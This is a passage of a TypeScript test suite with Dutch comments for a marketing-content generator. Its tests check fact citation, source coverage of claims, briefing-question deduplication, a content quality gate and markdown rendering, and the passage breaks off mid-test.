  ok("null citaat dekt niet", !isSupported("F1", facts, null));

  // Ontdubbelen: dezelfde vraag vanuit drie pagina's wordt één vraag.
  ok(
    "woordvolgorde maakt niet uit",
    claimKey("Pechhulp is inbegrepen") === claimKey("Inbegrepen: pechhulp"),
  );
  ok("leestekens maken niet uit", claimKey("Kost €419!") === claimKey("kost 419"));
  ok("meervoud valt samen", claimKey("de looptijden") === claimKey("de looptijd"));
  ok("echt andere claims blijven apart", claimKey("pechhulp inbegrepen") !== claimKey("apk inbegrepen"));
});

// ════════════════════════════════════════════════════════════════════════════
group("Bronnendekking van geschreven content (contentbriefing.md §9 / R5.3)", () => {
  const facts = numberFacts([
    { text: "All-in vanaf €419 per maand", source: "site", allowed: true, citable: true },
    { text: "4 jaar garantie", source: "klant", allowed: true, citable: true },
    { text: "Pechhulp: NEE", source: "klant", allowed: false, citable: true },
  ]);

  // Dit is de maat die geo_score vervangt. Die gaf in de praktijktest voor alle
  // drie de pagina's 100, ook voor de pagina met vijf verzonnen feiten. Een
  // cijfer dat nooit differentieert meet niets.
  const alles = sourceCoverage(
    [
      { claim: "Vanaf €419 per maand", factRef: "F1", quote: "All-in vanaf €419" },
      { claim: "4 jaar garantie op het werk", factRef: "F2", quote: "4 jaar garantie" },
    ],
    facts,
  );
  ok("alles onderbouwd is 100", alles.coverage === 100);
  ok("niets onherleidbaar", alles.unsupported.length === 0);

  // De Udenhout-fout: een bewering met een F-nummer dat niet bestaat.
  const verzonnen = sourceCoverage(
    [
      { claim: "Vanaf €419 per maand", factRef: "F1", quote: "All-in vanaf €419" },
      { claim: "Pechhulp is inbegrepen", factRef: "F7", quote: "pechhulp" },
    ],
    facts,
  );
  ok("onbestaand F-nummer telt niet mee", verzonnen.coverage === 50);
  ok("de onherleidbare bewering wordt teruggegeven", verzonnen.unsupported[0].claim.includes("Pechhulp"));

  // Verwijzen naar een VERBOD is geen onderbouwing maar een weerlegging.
  const verbod = sourceCoverage(
    [{ claim: "Pechhulp is inbegrepen", factRef: "F3", quote: "Pechhulp" }],
    facts,
  );
  ok("verbod onderbouwt niets", verbod.coverage === 0);

  // Het echte alibi uit de productieronde: een geldig F-nummer noemen bij een
  // bewering die dat feit niet doet.
  const alibi = sourceCoverage(
    [{ claim: "Wij leveren binnen 24 uur", factRef: "F1", quote: "binnen 24 uur" }],
    facts,
  );
  ok("geldig nummer met onvindbaar citaat telt niet", alibi.coverage === 0);

  // Geen beweringen is geen perfecte dekking maar een ontbrekend oordeel.
  ok("geen beweringen → null, niet 100", sourceCoverage([], facts).coverage === null);
  ok(
    "lege bewering telt niet mee",
    sourceCoverage([{ claim: "   ", factRef: "F1", quote: "x" }], facts).coverage === null,
  );
});

// ════════════════════════════════════════════════════════════════════════════
group("Briefingvragen selecteren (contentbriefing.md §3.4 / R5.1)", () => {
  const basis = {
    reason: "reden",
    kind: "aanvulling" as const,
    answerType: "tekst_kort" as const,
    options: [],
    suggestedAnswer: null,
    scope: "analyse" as const,
    priority: 1,
  };

  // Dezelfde vraag vanuit drie pagina's → één vraag die alle drie voedt.
  const samengevoegd = selectBriefingQuestions({
    candidates: [
      { ...basis, claimKey: "a", question: "Zit pechhulp erbij?", required: false, contentPieceIds: ["p1"] },
      { ...basis, claimKey: "a", question: "Zit pechhulp erbij?", required: true, contentPieceIds: ["p2"] },
      { ...basis, claimKey: "a", question: "Zit pechhulp erbij?", required: false, contentPieceIds: ["p3"] },
    ],
    alreadyKnown: new Set(),
  });
  ok("drie keer dezelfde vraag wordt één vraag", samengevoegd.length === 1);
  ok("alle drie de pagina's blijven eraan hangen", samengevoegd[0].contentPieceIds.length === 3);
  // Verplicht wint van optioneel: is de vraag voor één pagina kern, dan is hij kern.
  ok("verplicht wint van optioneel", samengevoegd[0].required === true);

  // Nooit vragen wat we al weten. Dat is geloofwaardigheidsverlies (§4 regel 6).
  const bekend = selectBriefingQuestions({
    candidates: [{ ...basis, claimKey: "a", question: "Al bekend?", required: true, contentPieceIds: ["p1"] }],
    alreadyKnown: new Set(["a"]),
  });
  ok("al bekende vraag wordt niet gesteld", bekend.length === 0);

  // Harde grens van acht, en het belangrijkste bovenaan.
  const veel = selectBriefingQuestions({
    candidates: Array.from({ length: 20 }, (_, i) => ({
      ...basis,
      claimKey: `k${i}`,
      question: `Vraag ${i}?`,
      required: i === 19,
      contentPieceIds: i === 19 ? ["p1", "p2", "p3"] : ["p1"],
    })),
    alreadyKnown: new Set(),
  });
  ok("afgekapt op acht", veel.length === MAX_QUESTIONS);
  ok("de zwaarste vraag staat bovenaan", veel[0].question === "Vraag 19?");

  // Lege vragen horen er nooit in te belanden.
  const leeg = selectBriefingQuestions({
    candidates: [{ ...basis, claimKey: "x", question: "   ", required: true, contentPieceIds: ["p1"] }],
    alreadyKnown: new Set(),
  });
  ok("lege vraag valt af", leeg.length === 0);

  // De eerlijke telling onder de knop: de klant mag altijd door, maar ziet wat
  // het overslaan hem kost (§6).
  ok("geen open vragen → geen tekst", describeSkipped([]) === "");
  const tekst = describeSkipped([
    { question: "Zit pechhulp erbij?", required: true },
    { question: "Wat is de looptijd?", required: true },
    { question: "Heb je een cijfer?", required: false },
  ]);
  ok("noemt alleen de verplichte", tekst.includes("pechhulp") && !tekst.includes("cijfer"));
});

// ════════════════════════════════════════════════════════════════════════════
group("Antwoord van de klant → feit of verbod (contentbriefing.md §3.1)", () => {
  // Het subtielste stukje van de briefing: "nee" is geen ontbrekend feit maar
  // een VERBOD. Zonder dat onderscheid redeneert het model bij een ontkennend
  // antwoord alsnog dat het er waarschijnlijk wel in zit.
  const nee = factFromAnswer({
    question: "Zit pechhulp in het maandbedrag?",
    answer: "Nee",
    answer_type: "ja_nee",
    answered_at: "2026-07-29T10:00:00Z",
  });
  ok("nee wordt een verbod", nee !== null && nee.allowed === false);
  ok("de vraag zit in de tekst", nee !== null && nee.text.includes("pechhulp"));

  const ja = factFromAnswer({
    question: "Zit pechhulp in het maandbedrag?",
    answer: "Ja",
    answer_type: "ja_nee",
    answered_at: "2026-07-29T10:00:00Z",
  });
  ok("ja wordt een bruikbaar feit", ja !== null && ja.allowed === true);

  ok(
    "leeg antwoord levert geen feit",
    factFromAnswer({ question: "X?", answer: "  ", answer_type: "tekst_kort", answered_at: null }) === null,
  );

  const bedrag = factFromAnswer({
    question: "Wat is het maandbedrag?",
    answer: "€419",
    answer_type: "bedrag",
    answered_at: "2026-07-29T10:00:00Z",
  });
  ok("vrij antwoord wordt vraag + antwoord", bedrag !== null && bedrag.text.includes("€419"));
  ok("bron vermeldt de klant", bedrag !== null && bedrag.source.startsWith("klant"));
});

// ════════════════════════════════════════════════════════════════════════════
group("Citaatplicht bij meerdere feiten (implementatieplan.md R8.3)", () => {
  const facts = numberFacts([
    { text: "Al 150 jaar gastvrijheid sinds 1862", source: "site", allowed: true, citable: true },
    {
      text: "Meer dan 100 hotels en restaurants wereldwijd",
      source: "site",
      allowed: true,
      citable: true,
    },
    { text: "Pechhulp: NEE", source: "klant", allowed: false, citable: true },
  ]);

  // Het echte geval uit de contentronde van 31 juli: één bewering die twee
  // bevestigde feiten combineert. Telde als ONBEWEZEN omdat er geen feit met
  // ref "F1, F2" bestaat, en trok source_coverage van 100 naar 80.
  ok(
    "twee feiten in één bewering tellen als onderbouwd",
    isSupported(
      "F1, F2",
      facts,
      "Al 150 jaar gastvrijheid sinds 1862; Meer dan 100 hotels en restaurants wereldwijd",
    ),
  );
  ok("puntkomma of pijp als scheidingsteken", isSupported("F1;F2", facts, "sinds 1862 | 100 hotels"));
  ok("'en' als scheidingsteken werkt ook", isSupported("F1 en F2", facts, "sinds 1862; 100 hotels"));

  // Streng blijven waar het moet: een echt nummer aanvullen met een verzonnen
  // nummer mag de dekking niet optillen.
  ok(
    "één bestaand plus één verzonnen nummer dekt niet",
    !isSupported("F1, F9", facts, "sinds 1862; iets anders"),
  );
  // Een citaatdeel dat nergens staat blijft ongedekt, ook al bestaan beide refs.
  ok(
    "citaatdeel dat er niet staat dekt niet",
    !isSupported("F1, F2", facts, "sinds 1862; pechhulp is inbegrepen"),
  );
  // Een verwijzing naar een verbod telt nooit mee, ook niet als tweede ref.
  ok("verbod als tweede nummer dekt niet", !isSupported("F1, F3", facts, "sinds 1862; pechhulp"));
});

// ════════════════════════════════════════════════════════════════════════════
group("Antwoorden van de klant in de feitenkaart (implementatieplan.md R8.1)", () => {
  const bevroren = numberFacts([
    {
      text: "Biedt Fysi-Unique preventieve begeleiding: ja",
      source: "klant, bevestigd 30-07-2026",
      allowed: true,
      citable: true,
    },
    { text: "Wordt met een 9,4 beoordeeld op Zorgkaart", source: "site", allowed: true, citable: true },
  ]);

  // Het geval dat de hele contentronde blootlegde: de klant CORRIGEERT een
  // eerder antwoord. De twee mogen niet naast elkaar op de kaart belanden,
  // want dan mag het model kiezen, en het koos de gunstige.
  const gecorrigeerd = mergeAnsweredFacts(bevroren, [
    {
      question: "Biedt Fysi-Unique preventieve begeleiding",
      fact: {
        text: "Biedt Fysi-Unique preventieve begeleiding: NEE",
        source: "klant, bevestigd 31-07-2026",
        allowed: false,
        citable: true,
        kind: "klant",
      },
    },
  ]);

  const preventie = gecorrigeerd.filter((f) => f.text.toLowerCase().includes("preventieve"));
  ok("een gecorrigeerd antwoord staat er maar één keer", preventie.length === 1);
  ok("het nieuwste antwoord wint", preventie[0]?.text.includes("NEE") === true);
  ok("een ontkenning wordt een verbod", preventie[0]?.allowed === false);
  ok(
    "sitefeiten blijven staan",
    gecorrigeerd.some((f) => f.text.includes("Zorgkaart")),
  );

  // Een nieuw antwoord dat nog niet op de kaart stond, komt er gewoon bij.
  const aangevuld = mergeAnsweredFacts(bevroren, [
    {
      question: "Welke blessures behandelt Fysi-Unique",
      fact: {
        text: "Welke blessures behandelt Fysi-Unique: shin splints, hielspoor",
        source: "klant, bevestigd 31-07-2026",
        allowed: true,
        citable: true,
        kind: "klant",
      },
    },
  ]);
  ok("een nieuw antwoord komt erbij", aangevuld.length === bevroren.length + 1);
  // Antwoorden van de klant horen bovenaan: wat bovenaan een prompt staat wordt
  // het best gebruikt (zelfde volgorde als buildFactBase aanhoudt).
  ok("het antwoord van de klant staat bovenaan", aangevuld[0].text.includes("shin splints"));
  ok("nummering blijft sluitend", aangevuld[0].ref === "F1" && aangevuld[1].ref === "F2");

  // Zonder antwoorden verandert er niets. Geen nummerwissel om niets.
  ok("geen antwoorden laat de kaart ongemoeid", mergeAnsweredFacts(bevroren, []) === bevroren);

  // ── Het bank-id overleeft het hernummeren (migratie 0036) ─────────────────
  //
  // Dit ging in de ketentest daadwerkelijk mis: het samenvoegen bouwde de items
  // veld voor veld opnieuw op en liet `id` weg, waardoor geen enkele bewering
  // nog een `factId` in `claims_json` kreeg. Het F-nummer is een positie en mág
  // schuiven; de identiteit niet.
  const metIds = numberFacts([
    { id: "bank-site", text: "Wordt met een 9,4 beoordeeld op Zorgkaart", source: "site", allowed: true, citable: true },
  ]);
  const behouden = mergeAnsweredFacts(metIds, [
    {
      question: "Welke blessures behandelt Fysi-Unique",
      fact: {
        text: "Welke blessures behandelt Fysi-Unique: shin splints",
        source: "klant, bevestigd 31-07-2026",
        allowed: true,
        citable: true,
        kind: "klant",
      },
      id: "bank-antwoord",
    },
  ]);
  ok("het id van het antwoord gaat mee", behouden[0]?.id === "bank-antwoord");
  ok("het id van het bestaande feit blijft staan", behouden[1]?.id === "bank-site");
  ok(
    "terwijl het F-nummer wél opschuift",
    metIds[0].ref === "F1" && behouden[1]?.ref === "F2",
  );
});

// ════════════════════════════════════════════════════════════════════════════
group("Bijna-dezelfde vraag samenvoegen (implementatieplan.md R8.4)", () => {
  // De drie echte formuleringen uit de Fysi-Unique-briefing. Alle drie kregen
  // een eigen claimKey en dus een eigen plek in de lijst van maximaal acht.
  const a = "Biedt Fysi-Unique preventieve begeleiding na herstel van hardloopblessures? Zo ja, welke specifieke diensten?";
  const b = "Welke preventieve begeleiding biedt Fysi-Unique na herstel van een hardloopblessure?";
  const c = "Biedt Fysi-Unique preventieve begeleiding aan na herstel van een hardloopblessure? Zo ja, welke specifieke diensten of programma's?";

  ok("drie formuleringen, één onderwerp", topicKey(a) === topicKey(b) && topicKey(b) === topicKey(c));
  ok("claimKey zag ze nog als verschillend", claimKey(a) !== claimKey(b));

  // Enkelvoud en meervoud mogen niet uit elkaar lopen. Dat was de eerste bug
  // in deze functie: "hardloopblessures" verloor z'n s en stopte, terwijl
  // "hardloopblessure" wél z'n e verloor.
  ok(
    "enkelvoud en meervoud vallen samen",
    topicKey("Welke hardloopblessure behandelen jullie") ===
      topicKey("Welke hardloopblessures behandelen jullie"),
  );

  // Echt andere onderwerpen blijven apart.
  ok(
    "andere onderwerpen blijven gescheiden",
    topicKey("Wat kost een behandeling bij Fysi-Unique?") !== topicKey(a),
  );

  const maakVraag = (question: string, extra: Partial<Parameters<typeof selectBriefingQuestions>[0]["candidates"][number]> = {}) => ({
    claimKey: claimKey(question),
    question,
    reason: "reden",
    kind: "aanvulling" as const,
    answerType: "tekst_kort" as const,
    options: [],
    suggestedAnswer: null,
    required: false,
    scope: "analyse" as const,
    contentPieceIds: ["p1"],
    priority: 1,
    ...extra,
  });

  const gekozen = selectBriefingQuestions({
    candidates: [maakVraag(a), maakVraag(b, { contentPieceIds: ["p2"] }), maakVraag(c)],
    alreadyKnown: new Set(),
  });
  ok("drie varianten worden één vraag", gekozen.length === 1);
  // De verliezers verdwijnen niet zonder sporen: hun pagina's worden aan de
  // winnaar gekoppeld, want het antwoord voedt ze allebei.
  ok(
    "de pagina's van alle varianten blijven gekoppeld",
    gekozen[0].contentPieceIds.includes("p1") && gekozen[0].contentPieceIds.includes("p2"),
  );
  ok("de kortste formulering wint", gekozen[0].question === b);

  // Vaste slots doen niet mee aan de grove ontdubbeling: die zijn met de hand
  // geformuleerd en bewust verschillend.
  const slots = slotQuestions("landing", "p1");
  const naSelectie = selectBriefingQuestions({ candidates: slots, alreadyKnown: new Set() });
  ok("vaste slots blijven allemaal staan", naSelectie.length === slots.length);
});

// ════════════════════════════════════════════════════════════════════════════
group("Vaste slots per bedrijfsmodel (implementatieplan.md R8.5)", () => {
  const lokaal = slotQuestions("landing", "p1", null, "dienstverlener");
  ok(
    "een dienstverlener krijgt de adresvraag",
    lokaal.some((v) => v.question.includes("telefoonnummer en adres")),
  );

  // Bol, Coolblue en Van der Valk konden deze vraag niet naar waarheid
  // beantwoorden; een verplichte vraag zonder waar antwoord nodigt uit tot
  // invullen wat niet klopt.
  for (const model of ["retailer", "platform"] as const) {
    const zonderVestiging = slotQuestions("landing", "p1", null, model);
    ok(
      `een ${model} krijgt geen adresvraag`,
      !zonderVestiging.some((v) => v.question.includes("telefoonnummer en adres")),
    );
    ok(
      `een ${model} krijgt wel een contactkanaal-vraag`,
      zonderVestiging.some((v) => v.question.includes("klanten met vragen")),
    );
  }

  // Onbekend model = onveranderd gedrag. Onbekend is geen reden om de vragenset
  // te wijzigen.
  ok(
    "onbekend bedrijfsmodel verandert niets",
    JSON.stringify(slotQuestions("landing", "p1", null, null)) ===
      JSON.stringify(slotQuestions("landing", "p1")),
  );
});

// ════════════════════════════════════════════════════════════════════════════
group("Deterministische kwaliteitspoort (implementatieplan.md R8.2/R8.7/R8.8)", () => {
  // De kop wordt bewust NIET als opening geteld: de Coolblue-pagina herhaalde
  // de doelvraag als kop, en een vraag herhalen is het tegenovergestelde van
  // hem beantwoorden.
  const opening = openingVan("### Kan ik een wasmachine afhalen?\n\nCoolblue biedt veel keuze.");
  ok("koppen tellen niet mee in de opening", !opening.includes("Kan ik een wasmachine afhalen"));
  ok("de eerste bewerende zin telt wel mee", opening.includes("Coolblue biedt veel keuze"));

  const doelvraag = "Kan ik een wasmachine online bestellen en hem daarna in de winkel afhalen?";

  // Het echte Coolblue-geval: opent met een omweg, en verwijst in de FAQ door
  // naar de site in plaats van de vraag te beantwoorden.
  const ontwijkend = checkContentGate({
    bodyMarkdown:
      "### Kan ik een wasmachine online bestellen en hem daarna in de winkel afhalen?\n\n" +
      "Coolblue biedt een uitgebreid assortiment wasmachines online en heeft 22 fysieke winkels.\n",
    faq: [
      {
        q: "Kan ik een wasmachine online bestellen en hem daarna in de winkel afhalen bij Coolblue?",
        a: "Coolblue heeft 22 winkels. Kijk voor de actuele mogelijkheden op de website.",
      },
    ],
    brandName: "Coolblue",
    targetQuestions: [doelvraag],
    distinctiveAnswers: [],
  });
  ok("een ja-of-nee-vraag zonder ja of nee valt door de poort", ontwijkend.checks.directAntwoord === false);
  ok("doorverwijzen telt als ontwijken", ontwijkend.checks.geenOntwijking === false);
  ok("de poort levert concrete verbeterpunten", ontwijkend.issues.length >= 2);

  // Hetzelfde onderwerp, maar mét een direct antwoord: dit moet er wél door.
  const direct = checkContentGate({
    bodyMarkdown:
      "Ja, je kunt een wasmachine online bestellen bij Coolblue en hem daarna afhalen in de winkel. " +
      "Coolblue heeft 22 winkels in Nederland waar dat kan.\n",
    faq: [],
    brandName: "Coolblue",
    targetQuestions: [doelvraag],
    distinctiveAnswers: [],
  });
  ok("een expliciet ja komt erdoor", direct.checks.directAntwoord === true);
  ok("de doelvraag staat in de opening", direct.checks.doelvraagInOpening === true);
  ok("de merknaam staat er expliciet in", direct.checks.merknaamExpliciet === true);
  ok("er staan concrete cijfers in", direct.checks.concreteFeiten === true);

  // Een open vraag ("welke", "waar") is geen ja-of-nee-vraag: dan is die controle
  // niet van toepassing en telt hij niet mee. Onbekend is geen onvoldoende.
  const openVraag = checkContentGate({
    bodyMarkdown: "Fysi-Unique in Amersfoort behandelt shin splints en hielspoor bij 200 hardlopers.",
    faq: [],
    brandName: "Fysi-Unique",
    targetQuestions: ["Welke praktijk in Amersfoort behandelt hardloopblessures?"],
    distinctiveAnswers: [],
  });
  ok("geen ja-of-nee-vraag → controle niet van toepassing", openVraag.checks.directAntwoord === null);
  ok("niet-uitgevoerde controles tellen niet mee", openVraag.score !== null && openVraag.score > 0);

  // R8.8, het onderscheidende antwoord van de klant moet terugkomen.
  const zonderOnderscheid = checkContentGate({
    bodyMarkdown: "Fysi-Unique in Amersfoort behandelt hardloopblessures met 20 jaar ervaring.",
    faq: [],
    brandName: "Fysi-Unique",
    targetQuestions: ["Welke praktijk behandelt hardloopblessures?"],
    distinctiveAnswers: ["Wij hebben een eigen looplab met videoanalyse op de loopband"],
  });
  ok("ongebruikt onderscheid valt op", zonderOnderscheid.checks.onderscheidGebruikt === false);

  const metOnderscheid = checkContentGate({
    bodyMarkdown:
      "Fysi-Unique in Amersfoort heeft een eigen looplab met videoanalyse op de loopband, " +
      "waarmee we sinds 2005 hardloopblessures behandelen.",
    faq: [],
    brandName: "Fysi-Unique",
    targetQuestions: ["Welke praktijk behandelt hardloopblessures?"],
    distinctiveAnswers: ["Wij hebben een eigen looplab met videoanalyse op de loopband"],
  });
  ok("gebruikt onderscheid wordt herkend", metOnderscheid.checks.onderscheidGebruikt === true);
  ok(
    "zonder opgegeven onderscheid is er niets te toetsen",
    direct.checks.onderscheidGebruikt === null,
  );
});

// ════════════════════════════════════════════════════════════════════════════
group("Scorekaart leest beide formaten (implementatieplan.md R8.7)", () => {
  // Pagina's van vóór R8.7 hebben de kale zelfrapportage in geo_json. Die
  // mogen niet leeg of fout renderen omdat het formaat veranderd is.
  const oud = geoRegels({
    answersTargetQuestionUpFront: true,
    hasStandaloneCitableSentences: false,
    namesTheBusinessExplicitly: true,
    usesConcreteFacts: true,
    answersFollowUpQuestions: true,
  });
  ok("oude vorm levert vijf regels", oud.length === 5);
  ok("oude vorm behoudt de waarden", oud.filter((r) => r.ok === true).length === 4);

  const nieuw = geoRegels({
    zelfrapportage: { answersTargetQuestionUpFront: true },
    deterministisch: {
      doelvraagInOpening: true,
      directAntwoord: null,
      geenOntwijking: false,
      merknaamExpliciet: true,
      concreteFeiten: true,
      citeerbareZin: true,
      onderscheidGebruikt: null,
    },
  });
  ok("nieuwe vorm gebruikt de deterministische uitkomst", nieuw.length === 7);
  ok("niet-uitgevoerde controles blijven null", nieuw.filter((r) => r.ok === null).length === 2);
  ok("een gezakte controle blijft zichtbaar", nieuw.some((r) => r.ok === false));

  // Een leeg veld mag niet crashen en niet doen alsof alles goed is.
  ok("leeg veld levert geen valse vinkjes", geoRegels(null).every((r) => r.ok === null));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nZinnen en markdown (S3, gedeelde basis)");

group("zinnen knippen en markdown strippen", () => {
  ok("Bol.com blijft heel", splitSentences("Bol.com is groot. En snel.").length === 2);
  ok("3.5 blijft heel", splitSentences("Het cijfer is 3.5 gemiddeld.").length === 1);

  const plat = stripMarkdown("### Kop\n\n**Fysi-Unique** biedt [zorg](/zorg) op maat.\n\n- punt een");
  ok("kopmarkering weg", !plat.includes("#"));
  ok("nadruk weg, woorden blijven", plat.includes("Fysi-Unique") && !plat.includes("**"));
  ok("linklabel blijft, doel weg", plat.includes("zorg") && !plat.includes("/zorg"));

  // De echte openingszin van de Fysi-Unique-pagina van 31 juli staat vetgedrukt.
  // Zou de vetmarkering blijven staan, dan zou de doelvraag-echo op de sterretjes
  // struikelen in plaats van op de woorden.
  const opening = firstSentences(
    "**Fysi-Unique in Amersfoort biedt preventieve begeleiding.** Dat doen we zo. En verder nog dit.",
    2,
  );
  ok("eerste twee zinnen, zonder opmaak", opening.includes("Fysi-Unique") && !opening.includes("**"));
  ok("derde zin blijft buiten", !opening.includes("verder nog dit"));
});

group("kop-ankers voor de inhoudsopgave (H.68)", () => {
  const md = "## Wat het kost\n\ntekst\n\n## Veelgestelde vragen\n\n### Hoe lang duurt het\n\ntekst\n\n## Veelgestelde vragen\n\ntekst";
  const headings = extractHeadings(md);
  ok("vier koppen gevonden", headings.length === 4);
  ok("niveau klopt", headings[2].level === 3);
  ok("basis-slug is leesbaar", headings[0].slug === "wat-het-kost");
  ok(
    "twee gelijke koppen krijgen verschillende ankers",
    headings[1].slug === "veelgestelde-vragen" && headings[3].slug === "veelgestelde-vragen-2",
  );

  const html = renderMarkdown(md);
  ok(
    "renderMarkdown zet dezelfde ankers als extractHeadings",
    headings.every((h) => html.includes(`id="${h.slug}"`)),
  );

  ok("lege markdown geeft lege lijst, geen crash", extractHeadings("").length === 0);
  ok(
    "opmaaktekens uit de koptekst voor de inhoudsopgave",
    extractHeadings("## **Vet** kopje")[0].text === "Vet kopje",
  );
});

group("een citaat wordt een <blockquote> (gevonden tijdens de sjabloonexport)", () => {
  // De regel wordt EERST ge-escaped (om ruwe HTML/scripts buiten te houden),
  // dus ">" is op het moment van matchen al "&gt;". De oude regex zocht nog
  // naar het kale ">" en matchte daardoor nooit: elk citaat dat het schrijvende
  // model ooit met "> " opmaakte, verscheen als kale tekst "&gt; ..." op de
  // pagina in plaats van als opgemaakt citaat. Nergens gemerkt omdat de tekst
  // zelf leesbaar bleef, alleen de opmaak ontbrak.
  const html = renderMarkdown("Een inleiding.\n\n> Dit is het citaat.\n\nEn de rest.");
  ok("het citaat wordt een <blockquote>", html.includes("<blockquote>Dit is het citaat.</blockquote>"), html);
  ok("staat niet meer als kale &gt;-tekst in de uitvoer", !html.includes("&gt; Dit is het citaat"));
});


// ════════════════════════════════════════════════════════════════════════════
console.log("\nRelevante pagina's kiezen (S1)");

group("onderwerptermen en taalvarianten", () => {
  const termen = topicTerms("wasmachine kopen", "Waar kan ik een wasmachine kopen en afhalen?");
  ok("onderwerpwoord zit erin", termen.includes("wasmachine"));
  ok("stopwoord eruit", !termen.includes("waar") && !termen.includes("een"));

  // Vier van de acht plekken in de Coolblue-feitenkaart gingen op aan Engelse
  // duplicaten van pagina's die er al in stonden.
  ok(
    "taalsegment eruit",
    canonicalPath("https://www.coolblue.nl/en/stores") === canonicalPath("https://www.coolblue.nl/stores"),
  );
  ok(
    "gewoon pad blijft heel",
    canonicalPath("https://fysi-unique.nl/specialismen/revalidatie/") === "/specialismen/revalidatie",
  );
});

group("de echte Coolblue-selectie", () => {
  // Exact de situatie van 31 juli: de homepage en de klantenservice haalden de
  // kaart, de tien wasmachinepagina's niet.
  const termen = topicTerms("wasmachine kopen", "Kan ik een wasmachine online bestellen en afhalen?");

  const advies = {
    url: "https://www.coolblue.nl/advies/wasmachine-bekijken-in-de-coolblue-winkel.html",
    title: "Persoonlijk advies over wasmachines in onze winkels",
    text: "Je vindt onze wasmachines in de winkels in Almere, Amsterdam en Tilburg. Bestel samen met een medewerker.",
  };
  const home = {
    url: "https://www.coolblue.nl",
    title: "Coolblue - Alles voor een glimlach",
    text: "Ga naar hoofdinhoud. Alles voor een glimlach. Onze winkels en klantenservice staan voor je klaar.",
  };
  const homeEn = { ...home, url: "https://www.coolblue.nl/en", title: "Coolblue - Anything for a smile" };

  ok("adviespagina scoort hoger dan de homepage", scorePage(advies, termen) > scorePage(home, termen));

  const gekozen = selectRelevantPages([home, homeEn, advies], termen, 2);
  ok("adviespagina staat vooraan", gekozen[0].url === advies.url);
  ok("Engelse duplicaat is samengevouwen", gekozen.length === 2);
  ok("de Nederlandse variant blijft", gekozen.every((p) => !p.url.endsWith("/en")));
});


// ════════════════════════════════════════════════════════════════════════════
console.log("\nSitetekst atomiseren: het vangnet (S1)");

group("alleen letterlijke zinnen overleven", () => {
  const pagina = [
    {
      url: "https://www.coolblue.nl/winkels",
      title: "Winkels",
      text: "Je vindt onze wasmachines in de winkels in Almere, Amsterdam en Tilburg. Alles voor een glimlach.",
    },
  ];

  const echt = verifyAtoms(
    [{ sentence: "Je vindt onze wasmachines in de winkels in Almere, Amsterdam en Tilburg.", pageIndex: 1 }],
    pagina,
  );
  ok("letterlijke zin komt door", echt.length === 1);
  ok("en is citeerbaar", echt[0]?.citable === true);
  ok("met de juiste bron", echt[0]?.source.includes("coolblue.nl/winkels"));

  // Dit is de hele reden dat het vangnet bestaat: een gladgestreken samenvatting
  // ziet er beter uit en is niet na te trekken.
  ok(
    "samengevatte zin valt weg",
    verifyAtoms([{ sentence: "Coolblue heeft winkels door heel Nederland.", pageIndex: 1 }], pagina).length === 0,
  );
  ok(
    "te korte zin valt weg",
    verifyAtoms([{ sentence: "Almere.", pageIndex: 1 }], pagina).length === 0,
  );
  ok(
    "verkeerd paginanummer wordt hersteld, niet afgestraft",
    verifyAtoms(
      [{ sentence: "Je vindt onze wasmachines in de winkels in Almere, Amsterdam en Tilburg.", pageIndex: 7 }],
      pagina,
    ).length === 1,
  );
  ok(
    "dezelfde zin twee keer levert één feit",
    verifyAtoms(
      [
        { sentence: "Je vindt onze wasmachines in de winkels in Almere, Amsterdam en Tilburg.", pageIndex: 1 },
        { sentence: "Je vindt onze wasmachines in de winkels in Almere, Amsterdam en Tilburg.", pageIndex: 1 },
      ],
      pagina,
    ).length === 1,
  );
});


// ════════════════════════════════════════════════════════════════════════════
console.log("\nWelke zinnen zijn een bewering? (S3)");

group("de noemer die de code bepaalt", () => {
  // Letterlijk de zin uit de Van der Valk-pagina die nooit als claim getagd werd
  // en dus onzichtbaar bleef voor elke controle.
  const gevonden = detectClaimSentences(
    {
      bodyMarkdown:
        "Op valk.com zoekt en vergelijkt u snel alle opties en reserveert u direct online. " +
        "Vergaderen is een vak apart. " +
        "Van der Valk heeft meer dan 100 hotels wereldwijd. " +
        "Wat kost een vergaderzaal?",
      faq: [{ q: "Is parkeren gratis?", a: "Van der Valk biedt gratis parkeren op eigen terrein." }],
    },
    "Van der Valk",
  );

  const zinnen = gevonden.map((g) => g.sentence);
  ok("de onbewaakte marketingzin wordt gezien", zinnen.some((z) => z.includes("reserveert u direct online")));
  ok("merknaamzin wordt gezien", zinnen.some((z) => z.includes("100 hotels")));
  ok("FAQ-antwoord telt mee", zinnen.some((z) => z.includes("gratis parkeren")));
  ok("een vraag is geen bewering", !zinnen.some((z) => z.includes("Wat kost")));
  ok("sfeerzin zonder signaal valt buiten", !zinnen.some((z) => z.includes("vak apart")));

  ok(
    "parafrase hoort bij de zin",
    claimMatchesSentence(
      "Van der Valk heeft meer dan 100 hotels",
      "Van der Valk heeft meer dan 100 hotels wereldwijd.",
    ),
  );
  ok(
    "een andere bewering hoort er niet bij",
    !claimMatchesSentence("Van der Valk biedt gratis wifi", "Van der Valk heeft meer dan 100 hotels wereldwijd."),
  );
});

group("dekking over de gedetecteerde noemer", () => {
  const facts = numberFacts([
    { text: "Meer dan 100 hotels en restaurants wereldwijd", source: "site", allowed: true, citable: true },
  ]);

  const detected = detectClaimSentences(
    {
      bodyMarkdown:
        "Van der Valk heeft meer dan 100 hotels wereldwijd. " +
        "Op valk.com reserveert u direct online een zaal.",
    },
    "Van der Valk",
  );

  const zonderTag = detectedCoverage({ detected, claims: [], facts });
  ok("niets taggen geeft geen 100 meer", zonderTag.coverage === 0);
  ok("beide zinnen staan als ongetagd", zonderTag.untagged.length === 2);

  const metTag = detectedCoverage({
    detected,
    claims: [
      {
        claim: "Van der Valk heeft meer dan 100 hotels wereldwijd",
        factRef: "F1",
        quote: "Meer dan 100 hotels en restaurants wereldwijd",
      },
    ],
    facts,
  });
  ok("de onderbouwde zin telt als gedekt", metTag.coverage === 50);
  ok("de fabricage blijft over als ongetagd", metTag.untagged.length === 1);
  ok(
    "en het is de juiste zin",
    metTag.untagged[0]?.sentence.includes("reserveert u direct online"),
  );

  ok(
    "een pagina zonder beweringen geeft null, niet 100",
    detectedCoverage({ detected: [], claims: [], facts }).coverage === null,
  );
});


// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe positioneringsvraag en de reservering (S4)");

group("de vraag die 0 van de 62 keer gesteld werd", () => {
  const vraag = positioningQuestion({
    evidence: [
      { attribute: "prijs", evidence: "Zitting manuele therapie: €60,00 per sessie" },
      { attribute: "service", evidence: "biedt fysiotherapie aan zonder dat een verwijsbrief nodig is" },
    ],
